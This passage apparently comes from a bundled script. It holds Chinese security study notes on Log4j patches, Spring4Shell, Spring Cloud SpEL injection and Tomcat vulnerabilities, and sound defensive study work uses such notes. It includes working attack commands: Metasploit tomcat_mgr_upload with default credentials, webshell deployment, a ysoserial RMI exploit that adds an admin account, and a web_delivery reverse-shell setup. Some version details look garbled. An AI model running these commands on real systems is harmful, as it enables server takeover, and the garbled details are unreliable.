                          1\u3001\u672C\u6B21\u5B89\u5168\u66F4\u65B0\u5173\u952E\u6709\u4E24\u4E2A\u4F4D\u7F6E\u3002
                                  xxxxxx
                  2\u3001\u5728 2.15.0-rc1\u7684\u66F4\u65B0\u5305\u4E2D\uFF0C\u79FB\u9664\u4E86\u4ECE Properties \u4E2D\u83B7\u53D6 Lookup \u914D\u7F6E\u7684\u9009\u9879\uFF0C\u5E76\u4FEE\u6539\u5224\u65AD\u903B\u8F91\uFF0C\u9ED8\u8BA4\u4E0D\u5F00\u542F lookup \u529F\u80FD\u3002

          2\u3001 \u300Arc2\u8865\u4E01\u300B \u53CA\u601D\u8003
                  1\u3001\u5728 rc1 \u66F4\u65B0\u88AB\u7ED5\u8FC7\u540E\uFF0C\u5B98\u65B9\u53D1\u5E03\u4E86 rc2\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF0C\u53EF\u4EE5\u770B\u5230\u662F\u5728 catch \u91CC\u6DFB\u52A0\u4E86 return\uFF0C\u4FEE\u590D\u4E86 rc1 \u7684\u7ED5\u8FC7\u3002
                          xxxxxx
                          1639334658277.png
                  2\u3001\u4F46\u662F\u8FD8\u6709\u5E08\u5085\u5E76\u4E0D\u6EE1\u8DB3\u4E8E\u6B62\u6B65\u5728\u5B98\u65B9\u7684\u66F4\u65B0\uFF0C\u5C1D\u8BD5\u4F7F\u7528 Appenders \u914D\u7F6E\u53CA\u5F02\u5E38\u5904\u7406\u7B49\u95EE\u9898\u6765\u8FDB\u884C\u7ED5\u8FC7\u3002
                          \u4F46\u603B\u4F53\u6765\u8BF4\uFF0C\u540E\u7EED\u7684\u51E0\u4E2A\u7248\u672C\u66F4\u65B0\u5DF2\u7ECF\u9ED8\u8BA4\u7981\u7528\u4E86 JNDI Lookup \u7684\u529F\u80FD\uFF0C\u751A\u81F3\u76F4\u63A5\u79FB\u9664\u4E86\u5BF9\u65E5\u5FD7\u6D88\u606F\u7684 Lookup \u529F\u80FD\u652F\u6301\uFF0C\u56E0\u6B64\u5728\u6B64\u5904\u7EE7\u7EED\u7814\u7A76\u7ED5\u8FC7\u7684\u610F\u4E49\u5E76\u4E0D\u5927\u3002

          3\u3001 \u300AUPDATE 3208 \u8865\u4E01\u300B
                  1\u3001\u5728\u6700\u8FD1\u4E00\u6B21\u7684\u7248\u672C\u63D0\u4EA4LOG4J2-3208\u4E2D\uFF0C\u53EF\u4EE5\u770B\u5230\u5B98\u65B9\u8868\u793A \u201CDisable JNDI by default\u201D\uFF0C\u9ED8\u8BA4\u5C06 JNDI \u5173\u95ED
                          1\u3001\u8FD9\u662F\u5982\u4F55\u5B9E\u73B0\u7684\u5462\uFF1F\u5176\u5B9E\u4E5F\u4E0D\u96BE\u60F3\u8C61\uFF0C\u90A3\u5C31\u662F\u5728 org.apache.logging.log4j.core.lookup.Interpolator \u521D\u59CB\u5316\u5185\u90E8\u53D8\u91CF strLookupMap \u65F6\uFF0C\u9700\u8981\u7ECF\u8FC7\u5224\u65AD\u624D\u5C06\u5B9E\u73B0 JNDI Lookup \u7684\u7C7B JndiLookup \u52A0\u5165\u3002

          4\u3001 \u300A2.16.0-rc1 \u8865\u4E01\u300B
                  1\u3001\u622A\u81F3\u4F5C\u8005\u53D1\u6587\u524D\uFF0C\u5B98\u65B9\u53C8\u63D0\u4E86\u4E00\u6B21\u66F4\u65B0\uFF0C\u7248\u672C\u53F7 2.16-rc1\uFF0C\u901A\u8FC7\u4E24\u4E2A\u7248\u672C\u7684\u5BF9\u6BD4\u53EF\u4EE5\u770B\u51FA\uFF0C\u5B98\u65B9\u79FB\u9664\u4E86 MessagePatternConverter \u7684\u5185\u90E8\u5B9E\u73B0\u7C7B LookupMessagePatternConverter\uFF0C\u5E76\u5220\u9664\u4E86\u76F8\u5173\u8C03\u7528\u4EE3\u7801\u3002


  `),Object(u.c)("Spring________Spring4Shell",`

  Spring4Shell \u6F0F\u6D1E\u5206\u6790

      Spring4Shell\u6F0F\u6D1E(CVE-2022-22965)
              1\u3001\u662F\u5728JDK 99\u53CA\u4EE5\u4E0A\u65B0\u589E\u6A21\u5757\u7279\u6027\u540E\u5BFC\u81F4\u7684\uFF0C\u5E76\u4E14\u662F\u9488\u5BF9 CVE-2010-1622\uFF08SpringMVC\u6846\u67B6\u4EFB\u610F\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF09 \u6F0F\u6D1E\u7684\u7248\u672C65\u3002
              2\u3001\u5728\u53C2\u6570\u7ED1\u5B9A\u8FC7\u7A0B\u4E2D\uFF0C\u5305\u542B\u7C7B\u5C5E\u6027\uFF0C\u4E0ECVE-2010-1622\u6F0F\u6D1E\u95EE\u9898\u7C7B\u4F3C\uFF1A

              3\u3001CVE-2022-22965\uFF0C\u662F CVE-2010-1622 \u4E3Aapp-Classer2\u7684\u7248\u672C
                      1\u3001\u5728 JDK11 + spring-webmvc5.3.377 + spring-webmvc5.3.777 \u4E2D\u8C03\u8BD5\uFF0C\u53D1\u73B0\u901A\u8FC7 class.module.class5Loader* \uFF0C\u53EF\u4EE5\u52A0\u8F7D Paralleler2.2.ClassLoader \u5BF9 WebClassLoader \u7684\u68C0\u6D4B\uFF1A
                              1\u3001\u6A21\u5F0F\u6307\u5B9A\u65E5\u5FD7\u8BB0\u5F55\u7684\u683C\u5F0F\uFF0C\u540E\u7F00\u6307\u5B9A\u65E5\u5FD7\u7684\u540E\u7F00\u4FEE\u9970\u4E3A.jsp\uFF0C\u76EE\u5F55\u6307\u5B9A\u4FDD\u5B58\u7684\u76EE\u5F55\u65E5\u5FD7webapps/ROOT\uFF0C\u524D\u7F00\u6307\u5B9A\u6587\u4EF6\u540Dtomcatwar\uFF0CfileDateFormat\u6307\u5B9A\u6587\u4EF6\u540D\u65E5\u671F\u683C\u5F0F\uFF0C
                                      1\u3001\u4E0A\u8FF0 payload \uFF0C\u901A\u8FC7 Tomcat \u7684 \u7C7BAbstractAccessLogValve \u6307\u5B9A\u4E86\u65E5\u5FD7\u7684\u5B58\u50A8\u683C\u5F0F\u3001\u76EE\u5F55\u548C\u6587\u4EF6\u540D\uFF0C\u5B9E\u73B0\u4E86Webshell\u7684\u4E0A\u4F20\u3002

  `),Object(u.c)("Spring________SpringCloud",`

  \u4E00\u4E9B\u6982\u5FF5\uFF1A
      1\u3001\u300ASpEL\u4ECB\u7ECD\u300B
              SpEL\uFF08Spring Expression Language\uFF09\uFF0C\u5373Spring\u8868\u8FBE\u5F0F\u8BED\u8A00\uFF0C\u662F\u6BD4JSP\u7684EL\u66F4\u5F3A\u5927\u7684\u4E00\u79CD\u8868\u8FBE\u5F0F\u8BED\u8A00\u3002


  SpringCloud Gateway \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E
      \u6F0F\u6D1E\u7B80\u4ECB
              1\u3001Spring Cloud Gateway\u5B58\u5728\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF0C\u8BE5\u6F0F\u6D1E\u662F\u53D1\u751F\u5728Spring Cloud Gateway\u5E94\u7528\u7A0B\u5E8F\u7684Actuator\u7AEF\u70B9\uFF0C
                      \u5176\u5728\u542F\u7528\u3001\u516C\u5F00\u548C\u4E0D\u5B89\u5168\u7684\u60C5\u51B5\u4E0B\u5BB9\u6613\u53D7\u5230\u4EE3\u7801\u6CE8\u5165\u7684\u653B\u51FB\u3002\u653B\u51FB\u8005\u53EF\u5229\u7528\u8BE5\u6F0F\u6D1E\u901A\u8FC7\u6076\u610F\u521B\u5EFA\u5141\u8BB8\u5728\u8FDC\u7A0B\u4E3B\u673A\u4E0A\u6267\u884C\u4EFB\u610F\u8FDC\u7A0B\u8BF7\u6C42\u3002

      \u5F71\u54CD\u7248\u672C
              Spring Cloud GateWay 3.1.0
              Spring Cloud GateWay >=3.0.0\uFF0C<=3.0.6
              Spring Cloud GateWay <3.0.0

      \u90E8\u5206\u539F\u7406
              1\u3001\u5728\u6DFB\u52A0filter\u65F6\u8F93\u5165\u4E86 spel \u8868\u8FBE\u5F0F\uFF0C\u88AB\u5F53\u4F5Cproperties\u8FDB\u884C\u89E3\u6790\uFF0C\u6700\u7EC8\u5BFC\u81F4\u6076\u610F\u8868\u8FBE\u5F0F\u88AB\u6267\u884C\uFF0C\u4ECE\u800C\u5B9E\u73B0rce\u3002

      \u6F0F\u6D1E\u590D\u73B0
              1\u3001\u4F7F\u7528P\u725B\u7684vulhub\u73AF\u5883\u8FDB\u884C\u590D\u73B0(https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947)
                      1\u3001\u5148 POST\u8BF7\u6C42 \u521B\u5EFAroute\u548Cfilter
                      2\u3001\u7136\u540E POST\u8BF7\u6C42 /refresh\uFF0C\u4F7F\u65B0\u5EFA\u7684uri\u548Cfilter\u751F\u6548
                      3\u3001\u7136\u540E GET\u8BF7\u6C42 /actuator/gateway/routes/test\uFF0C\u89E6\u53D1spel\uFF0C\u5E76\u5F97\u5230\u56DE\u663E


  Spring Cloud Function SPEL\u8868\u8FBE\u5F0F\u6CE8\u5165\u6F0F\u6D1E
      \u6F0F\u6D1E\u7B80\u4ECB
              1\u3001Spring Cloud \u4E2D\u7684 ServerLess\u6846\u67B6 Spring Cloud Function\uFF0C\u4E2D\u7684 RoutingFunction \u7C7B\u7684 apply \u65B9\u6CD5\uFF0C
                      \u5B83\u5C06\u8BF7\u6C42\u5934\u4E2D\u7684 \u201Cspring.cloud.function.routing-expression\u201D \u53C2\u6570\u4F5C\u4E3A Spel \u8868\u8FBE\u5F0F\u8FDB\u884C\u5904\u7406\uFF0C
                              \u9020\u6210Spel\u8868\u8FBE\u5F0F\u6CE8\u5165\uFF0C\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u8BE5\u6F0F\u6D1E\u6267\u884C\u4EFB\u610F\u4EE3\u7801\u3002

      \u5F71\u54CD\u7248\u672C
              \u300A3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2\u300B

      \u6F0F\u6D1E\u539F\u7406
              1\u3001\u4EE5\u4E0B\uFF0C\u662F\u4E00\u4E9B\u7EC6\u8282\uFF1A\uFF08\u5012\u4E0D\u5FC5\u8BF4\u7684\u8FD9\u4E48\u6E05\u695A\uFF09
                      1\u3001apply\u65B9\u6CD5\u4F1A\u5C06http\u5934\u90E8\u4E2D\u7684Spel\u8868\u8FBE\u5F0F\u8FDB\u884C\u89E3\u6790\uFF0C\u4ECE\u800C\u9020\u6210Spel\u8868\u8FBE\u5F0F\u6CE8\u5165\u3002
                      2\u3001\u8FDB\u5165\u5230apply()\u65B9\u6CD5\u540E\u3001\u4F1A\u8C03\u7528route() \u5728\u8BE5\u65B9\u6CD5\u4E2D\u4F1A\u53BB\u5224\u8BFBinput\u662F\u5426\u4E3A message\u7684\u5B9E\u4F8B\uFF0Cfunction \u662F\u5426\u4E3A\u7A7A\u3001
                              1\u3001\u7136\u540E\u8FDB\u5165else if \u53BB\u83B7\u53D6\u5934\u4FE1\u606F\u3001\u83B7\u53D6key\u503C spring.cloud.function.routing-expression \u3001\u5728\u4E2D\u95F4\u4F1A\u5BF9\u6709\u65E0\u7A7A\u683C\u505A\u5224\u65AD\u3002\u7136\u540E\u7EE7\u7EED\u5411\u4E0B\u8D70\u3002
                      3\u3001routingExpression \u4F1A\u505A\u4E3A\u53C2\u6570\u4F20\u5165\u5230 springframework/expression/common/TemplateAwareExpressionParser/parseExpression()\u65B9\u6CD5\u4E2D\u3002
                      4\u3001\u5224\u8BFB\u5176context\u662F\u5426\u4E3Anone\u503C\uFF0C\u518D\u8FDB\u5165
                              1\u3001springframework/expression/spel/standard/SpelExpressionParser/doPareExpression() \u4F1Anew \u4E00\u4E2A InternalSpelExpressionParser \u7C7B\u8C03\u7528 doPareExpression() \u7EE7\u7EED\u8DDF\u8FDB\u3002
                              2\u3001\u5728springframeworl/expression/spel/stand/InternalSpelExpressionParser/doParseExpression()\u65B9\u6CD5\u4E2D\u3001\u4F1A\u5728tokenizer.process()\u4E2D \u5BF9token\u8FDB\u884C \u6E90\u7801\u4E0E\u5B57\u8282\u7801\u7684\u5224\u65AD\u64CD\u4F5C\u3001\u7EE7\u7EED\u5411\u4E0B\u3002
                              3\u3001\u4F1Anew \u4E00\u4E2ASpelExpression() \u8DDF\u8FDB\u5230 springframwork/expression/spel/standard/SpelExpression/SpelExpression()\u3002
                      5\u3001\u5728SpelExpression()\u65B9\u6CD5\u4E2D\u4F1A\u5C06\u5C06\u8868\u8FBE\u5F0F\u8D4B\u503C\u5230 this.expression \uFF0C
                              1\u3001\u7EE7\u7EED\u8DDF\u8FDB return\u5230 springframework/expression/spel/standard/SpelpressionParser/doParseExpression()\u3001
                              2\u3001\u7EE7\u7EEDreturn\u5230springframework/expression/common/TemplateAwareExpressionPareser/pareExpression()\u3001
                              3\u3001return springframework/cloud/function/context/config/RoutingFunction/functionFromExpression()
                      6\u3001\u5728functionFromExpression()\u65B9\u6CD5\u4E2D\u4F1A\u8FDB\u5165MessageUtils.toCaseInsensitiveHeadersStructure()\u3002
                      7\u3001\u8C03\u7528MessageStructureWithCaseInsensitiveHeaderKeys()\uFF0C\u8FDB\u5165\u5230putAll()\u65B9\u6CD5 \u83B7\u53D6message\u4E2D\u5934\u4FE1\u606F\u3002
                      8\u3001\u6700\u540E\u4F1A\u8FDB\u5165\u6F0F\u6D1E\u89E6\u53D1\u70B9\u3002




  `)),Object(u.a)(A||(A=Object(t.a)([`
  \u3010\u4E2D\u95F4\u4EF6\u3011  \uFF08\u5176\u5B9E\u548C\u3010\u6846\u67B6\u3011\u4E5F\u5DEE\u4E0D\u591A\uFF09
  \u3010Tomcat\u3011
  \u3010WebLogic\u3011
  \u3010Jboss\u3011
  \u3010Jetty\u3011
  \u3010Shiro\u3011

  \u300ATomcat\u6F0F\u6D1E\u300B`,`

  \u300AWebLogic\u300B`,`



  \u300AJBoss\u300B`,`

  \u300AJetty\u300B`,`

  \u300AShiro\u300B`,`

  `])),Object(u.c)("Tomcat\u6F0F\u6D1E",`



  Tomcat\u6F0F\u6D1E

      \u8D44\u6599\uFF1A
              \u6709\u591A\u4E2A\u6D1E\uFF1Ahttps://paper.seebug.org/1677/
              \u5BF9 Tomcat Manager APP \u7684\u8865\u5145\uFF1Ahttps://www.bookstack.cn/read/anbai-inc-javaweb-sec/java-web-container-Tomcat-TomcatPasswordBruteForce.md
              \u589E\u8865\u4E86\u5F88\u591A\u8F83\u51B7\u95E8\u7684\u6F0F\u6D1E\uFF1Ahttps://www.freebuf.com/articles/paper/253666.html


      Tomcat\u8FDC\u7A0B\u90E8\u7F72\u6F0F\u6D1E    \uFF08\u5F31\u53E3\u4EE4&war\u8FDC\u7A0B\u90E8\u7F72\uFF09

              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u8FD9\u662FJSP/PHP\u7F51\u7AD9\u8FDC\u7A0B\u90E8\u7F72\u7684\u4E00\u4E2A\u5DE5\u5177\uFF0C\u7BA1\u7406\u5458\u53EA\u9700\u8981\u8FDC\u7A0B\u4E0A\u4F20\u4E00\u4E2AWAR\u683C\u5F0F\u7684\u6587\u4EF6\uFF0C\u4FBF\u53EF\u53D1\u5E03\u5230\u7F51\u7AD9\uFF0C\u65B9\u4FBF\u4E86\u5F00\u53D1\u4EBA\u5458\u90E8\u7F72\u4EE3\u7801\u7684\u540C\u65F6\uFF0C\u4E5F\u53EF\u6210\u4E3A\u653B\u51FB\u8005\u4E0A\u4F20\u6728\u9A6C\u655E\u5F00\u4E86\u5927\u95E8\u3002

              \u539F\u7406\u5206\u6790
                      1\u3001\u5728 Tomcat8 \u73AF\u5883\u4E0B\u9ED8\u8BA4\u8FDB\u5165\u540E\u53F0\u7684\u5BC6\u7801\u4E3Atomcat/tomcat\uFF0C\u672A\u4FEE\u6539\u9020\u6210\u672A\u6388\u6743\u5373\u53EF\u8FDB\u5165\u540E\u53F0\u3002

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u6F0F\u6D1E\u63A2\u6D4B\uFF1A
                              \u901A\u8FC7\u8BBF\u95EE http://localhost:8080/manager \u7BA1\u7406\u5730\u5740\uFF0C\u5C1D\u8BD5\u5F31\u53E3\u4EE4\u6216\u9ED8\u8BA4\u53E3\u4EE4\uFF0C\u82E5\u80FD\u767B\u9646\u6210\u529F\uFF0C\u5219\u5B58\u5728\u6B64\u6F0F\u6D1E
                      2\u3001\u7B2C\u4E00\u79CD\u65B9\u5F0F\uFF0C\u624B\u52A8\uFF1A
                              1\u3001\u9996\u5148\uFF0C\u8FDB\u5165\u5230\u4E86 <ip>:8080/manager  \u540E\u53F0\u7684\u9875\u9762\uFF1A
                                      1\u3001\u770B\u5230\u8FD9\u91CC\u6709\u4E00\u4E2A \u4E0A\u4F20War\u5305 \u7684\u5730\u65B9\u3002\u8FD9\u91CC\u5F88\u591Ajava\u7684\u4E2D\u95F4\u4EF6\u90FD\u53EF\u4EE5\u7528 War\u8FDC\u7A0B\u90E8\u7F72 \u6765\u62FFshell\uFF0Ctomcat\u4E5F\u4E0D\u4F8B\u5916\u3002
                                      2\u3001\u9996\u5148\u5C06ice.jsp\u6253\u5305\u6210test.war
                                              \u7C7B\u4F3C\u6307\u4EE4\uFF1A\u300A  jar -cvf test.war .  \u300B
                                      3\u3001\u70B9\u51FB\u4E0A\u4F20\u5373\u53EF\u770B\u5230\u4E0A\u4F20\u7684 test.war \u5DF2\u7ECF\u90E8\u7F72\u6210\u529F
                              2\u3001\u8BBF\u95EE\u4E00\u4E0B\u6CA1\u6709\u62A5\u9519404\u90A3\u4E48\u5E94\u8BE5\u5DF2\u7ECF\u4E0A\u4F20\u6210\u529F
                              3\u3001\u4F7F\u7528 \u51B0\u874E \u8FDE\u63A5\u5373\u53EF\u5F97\u5230shell
                      3\u3001\u53E6\u4E00\u79CD\u65B9\u5F0F\uFF0C\u8FD9\u91CC\u4E5F\u53EF\u4EE5\u8FD0\u7528 msf\u5DE5\u5177 \u7684 \u300Aexploit/multi/http/tomcat_mgr_upload\u300B\u6A21\u5757\uFF1A
                              1\u3001\u76F8\u5173\u6A21\u5757\uFF0C\u4F7F\u7528\u6D41\u7A0B\uFF1A
                                      use exploit/multi/http/tomcat_mgr_upload
                                      set HttpPassword tomcat
                                      set HttpUsername tomcat
                                      set rhost 192.168.1.8
                                      set rport 8080
                                      run
                              2\u3001\u8FD0\u884C\u5373\u53EF\u5F97\u5230\u4E00\u4E2Ameterpreter\uFF08\u5F3A\u5316\u7248\u7684shell\u6728\u9A6C\uFF09\u3002


      Tomcat \u5B89\u5168\u7ED5\u8FC7\u6F0F\u6D1E \uFF08VE-2012-3439\uFF09
      Tomcat \u62D2\u7EDD\u670D\u52A1\u6F0F\u6D1E \uFF08CVE-2014-0050\uFF09
      Tomcat \u62D2\u7EDD\u670D\u52A1\u6F0F\u6D1E \uFF08CVE-2014-0230\uFF09
      Tomcat Manager \u548C Host Manager \u5E94\u7528\u7A0B\u5E8F\u5B89\u5168\u6F0F\u6D1E \uFF08CVE-2015-5351\uFF09
      Tomcat \u4F1A\u8BDD\u56FA\u5B9A\u6F0F\u6D1E \uFF08CVE-2015-5346\uFF09
      Tomcat session-persistence \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E \uFF08CVE-2016-0714\uFF09

      Tomcat \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E \uFF08CVE-2016-1240\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      Tomcat 8 <= 8.0.36-2
                      Tomcat 7 <= 7.0.70-2
                      Tomcat 6 <= 6.0.45+dfsg-1~deb8u1

              \u5229\u7528\u6761\u4EF6
                      1\u3001Debian\u6216\u8005Ubuntu\u7684\u7279\u5B9A tomcat deb\u5305\u5FC5\u987B\u672A\u5347\u7EA7\uFF0C\u73B0\u5728\u9ED8\u8BA4\u5728Ubuntu14.04 \u4EE5\u540E\u7684\u7CFB\u7EDF\u4E2D\uFF0C\u5B98\u65B9\u5728\u4E0A\u6E38 apt\u6E90 \u5C31\u65E9\u5DF2\u4FEE\u590D\u4E86\u8BE5\u8F6F\u4EF6\u5305\u6F0F\u6D1E\u3002

              \u6F0F\u6D1E\u6982\u8FF0

              \u539F\u7406\u5206\u6790
                      1\u3001\u5728 tomcat\u670D\u52A1 \u5728\u542F\u52A8\u65F6\u4F1A\u5C06 log\u6587\u4EF6 catalina.out \u7684\u6240\u6709\u8005\u6539\u4E3A tomcat\u7528\u6237\uFF0C\u542F\u52A8\u811A\u672C\u901A\u5E38\u5374\u662F\u4EE5 root\u6743\u9650 \u5728\u6267\u884C\u3002
                              1\u3001\u90A3\u4E48\u5C31\u53EF\u4EE5\u7528\u521B\u5EFA\u8F6F\u94FE\u63A5\u7684\u65B9\u5F0F\u5728 root \u91CD\u542F tomcat\u670D\u52A1 \u65F6\u5C06\u4EFB\u610F\u6587\u4EF6\u7684\u5C5E\u4E3B\u6539\u4E3A tomcat \u8D26\u6237\u3002\u8FBE\u5230\u8BBF\u95EE\u7CFB\u7EDF\u6838\u5FC3\u914D\u7F6E\u6587\u4EF6\u7684\u76EE\u7684\u3002
                              2\u3001\u6BD4\u5982\u4E8B\u5148\u5728 tomcat\u6743\u9650 \u4E0B\uFF0C\u5C06 catalina.out \u4FEE\u6539\u4E3A\u6307\u5411\u90A3\u4E9B\u539F\u672C\u9700\u8981\u9AD8\u6743\u9650\u624D\u80FD\u8BBF\u95EE\u5173\u952E\u7CFB\u7EDF\u6587\u4EF6\u7684\u8F6F\u94FE\u63A5\u3002
                              3\u3001\u6B64\u540E root \u91CD\u542F tomcat \u4FBF\u53EF\u4EE5\u8BBF\u95EE\u8BE5\u7CFB\u7EDF\u914D\u7F6E\u6587\u4EF6\u3002

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u590D\u73B0\u8FC7\u7A0B\uFF1A
                              1\u3001\u6211\u4EEC\u5047\u8BBE\uFF0C\u5DF2\u7ECF\u5B8C\u6210\u4E86 \u300A \u5148\u5C1D\u8BD5\u901A\u8FC7\u90E8\u7F72war\u5305\u5F39\u56DE\u4E00\u4E2A\u4F4E\u6743\u9650\u7684meterpreter\u7684shell \u300B \u8FD9\u4E00\u6B65\u3002
                                      1\u3001\u968F\u540E\u770B\u5230meterpreter\u88AB\u6B63\u5E38\u53CD\u5F39\u56DE\u6765  \u8FDE\u63A5\u6210\u529F\uFF0C\u6B64\u65F6\u5F39\u56DE\u7684\u6743\u9650\u4ECD\u7136\u6BD4\u8F83\u4F4E,\u53EA\u662F\u4E2Atomcat\u670D\u52A1\u7528\u6237\u6743\u9650\u3002
                              2\u3001\u7136\u540E\uFF1A
                                      1\u3001\u627E\u5230catalina.out\u6587\u4EF6\u6240\u5728\u7684\u8DEF\u5F84\uFF0C\u9ED8\u8BA4\u4F1A\u5728/var/log/tomcat7\uFF0C\u4E0A\u4F20 exp \u811A\u672C\u5E76\u8D4B\u4E88\u6267\u884C\u6743\u9650\u3002
                                              1\u3001\u6267\u884CLinux\u547D\u4EE4\uFF1A
                                                      \u300A chmod +x tomcat-rootprivesc-deb.sh \u300B
                                      2\u3001\u8DDF\u4E0A catalina.out\u65E5\u5FD7\u6587\u4EF6 \u6240\u5728\u8DEF\u5F84\uFF0C\u6267\u884Cexp\u811A\u672C\u3002
                                      3\u3001\u5F85\u76EE\u6807\u91CD\u542Ftomcat\u670D\u52A1\uFF0C\u6211\u4EEC\u4FBF\u53EF\u83B7\u53D6\u4E00\u4E2Aroot\u6743\u9650\u7684shell\uFF0C
                                              1\u3001\uFF08 \u540C\u65F6\uFF0C\u6211\u4EEC\u4E5F\u53EF\u4EE5\u5C1D\u8BD5\uFF1A\u624B\u52A8\u628Atomcat\u8FDB\u7A0B\u5E72\u6389\uFF0C\u7B49\u7BA1\u7406\u5458\u91CD\u542Ftomcat \uFF09
                                              2\u3001\u5728tmp\u76EE\u5F55\u4E0B\u4E0B\u4F1A\u751F\u6210\u4E00\u4E2A\u5E26\u6709 suid \u6743\u9650\u7684 tomcat root sh\u6587\u4EF6\u3002




      Tomcat Commons Fileupload \u62D2\u7EDD\u670D\u52A1\u6F0F\u6D1E \uFF08CVE-2016-3092\uFF09
      Tomcat httpoxy \u5B89\u5168\u6F0F\u6D1E \uFF08CVE-2016-5388\uFF09
      Tomcat \u5B89\u5168\u7ED5\u8FC7\u6F0F\u6D1E \uFF08CVE-2016-6816\uFF09

      Tomcat \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E \uFF08CVE-2016-8735\uFF09
              \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                      Apache Tomcat 9.0.0.M1 to 9.0.0.M11
                      Apache Tomcat 8.5.0 to 8.5.6
                      Apache Tomcat 8.0.0.RC1 to 8.0.38
                      Apache Tomcat 7.0.0 to 7.0.72
                      Apache Tomcat 6.0.0 to 6.0.47
              \u5229\u7528\u6761\u4EF6

              \u6F0F\u6D1E\u6982\u8FF0
                      1\u3001\u5728 tomcat \u4E2D\u9ED8\u8BA4\u4F1A\u4F7F\u7528JmxRemoteLifecycleListener \u8FD9\u4E2A\u76D1\u542C\u5668\u6765\u76D1\u63A7 tomcat \u5E73\u65F6\u7684\u5404\u79CD\u8FD0\u884C\u72B6\u6001\u3002
                      2\u3001\u4F46 Oracle \u5728\u4FEE\u590D\u4E86JmxRemoteLifecycleListener \u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E[CVE-2016-3427]\u540E\uFF0C\u5374\u5FD8\u8BB0\u4E86\u53CA\u65F6\u5BF9tomcat\u4E2D\u7684jmx\u76D1\u542C\u5668\u8FDB\u884C\u5347\u7EA7\u3002
                              1\u3001\u6240\u4EE5\u5B83\u672C\u8D28\u8FD8\u662F jmx \u7684\u6F0F\u6D1E\u5E76\u975E tomcat \u81EA\u8EAB\u6F0F\u6D1E\u3002
                              2\u3001\u5B9E\u9645\u4E0A JmxRemoteLifecycleListener \u5E73\u65F6\u7528\u6765\u505A\u76D1\u63A7\u5C45\u591A\uFF0C\u5B9E\u9645\u76F4\u63A5\u4ECE\u5916\u90E8\u78B0\u5230\u8BE5\u7AEF\u53E3\u7684\u673A\u4F1A\u4E5F\u5E76\u4E0D\u662F\u7279\u522B\u591A\u3002

              \u539F\u7406\u5206\u6790

              \u6F0F\u6D1E\u5229\u7528
                      1\u3001\u590D\u73B0\u8FC7\u7A0B\uFF1A
                              1\u3001\u73AF\u5883\u642D\u5EFA\uFF1A
                                      1\u3001\u5148\u642D\u5EFA\u597D\u57FA\u7840\u73AF\u5883\uFF0C\u914D\u7F6E JmxRemoteLifecycleListener\u76D1\u542C\u5668\u3002
                                      2\u3001\u800C\u540E\u7F16\u8F91conf\\server.xml\u6587\u4EF6\u6DFB\u52A0\u5982\u4E0B\u7684\u76D1\u542C\u5668
                                              // \u7AEF\u53E3\u53EF\u968F\u610F,\u53EA\u8981\u4E0D\u51B2\u7A81\u5373\u53EF
                                              <Listener className="org.apache.catalina.mbeans.JmxRemoteLifecycleListener" rmiRegistryPortPlatform="10001" rmiServerPortPlatform="10002" />
                                      3\u3001\u4E4B\u540E,\u518D\u53BB\u7F16\u8F91bin\\catalina.bat \u6587\u4EF6\uFF0C\u6DFB\u52A0\u5982\u4E0B\u53D8\u91CF\u76F4\u63A5\u5728 setlocal \u4E0B\u9762\u5F00\u59CB\u6DFB\u52A0\u3002
                                              set JAVA_OPTS=-Dcom.sun.management.jmxremote
                                                      -Djava.rmi.server.hostname=192.168.x.x
                                                      -Dcom.sun.management.jmxremote.port=1099
                                                      -Dcom.sun.management.jmxremote.authenticate=false
                                                      -Dcom.sun.management.jmxremote.ssl=false
                                      4\u3001\u6267\u884C\\bin\\startup.bat \u811A\u672C\u542F\u52A8tomcat
                              2\u3001\u8FDB\u884C\u653B\u51FB\uFF1A
                                      1\u3001\u6211\u4EEC\u80AF\u5B9A\u5F97\u5148\u53D1\u73B0\u76EE\u6807\u6709\u8FD9\u6837\u7684\u7AEF\u53E3\u624D\u884C\uFF0C\u901A\u8FC7nmap\u5BF9\u6307\u5B9A\u7684\u5355\u4E2A\u76EE\u6807\u673A\u5668\u8FDB\u884C\u5168\u7AEF\u53E3\u626B\u63CF\u5E76\u5C1D\u8BD5\u83B7\u53D6\u670D\u52A1banner\u3002
                                              nmap -n -sT -sV -p 1-50000 --open -Pn -v 192.168.x.x
                                      2\u3001\u800C\u540E\u5229\u7528\u7ECF\u5178\u7684ysoserial java\u53CD\u5E8F\u5217\u5316payload\u5DE5\u5177\uFF0C\u5C1D\u8BD5\u76F4\u63A5\u5728\u8FDC\u7A0B\u76EE\u6807\u673A\u5668\u4E0A\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4\u3002
                                              java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.x.x 10001 Groovy1 "cmd.exe /c net user flag "Admin!@#45" /add"
                                      3\u3001\u6216\u8005\uFF0C\u50CF\u4E0A\u9762\u8FD9\u6837\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4\uFF0C\u914D\u5408 msf \u4E00\u8D77\u5229\u7528\u5C1D\u8BD5\u5F39\u56DE\u4E00\u4E2Ameterpreter\u7684shell
                                           msf5 > use exploit/multi/script/web_delivery
                                           msf5 > set target 3
                                           msf5 > use exploit/multi/script/web_delivery
                                           msf5 > set target 3
                                           msf5 > set payload windows/meterpreter/reverse_tcp_rc4_dns
                                           msf5 > set lhost 192.168.3.7
                                           msf5 > set lport 53
                                           msf5 > set rc4password
                                           msf5 > exploit



      Tomcat \u5B89\u5168\u6F0F\u6D1E \uFF08CVE-2017-5647\uFF09
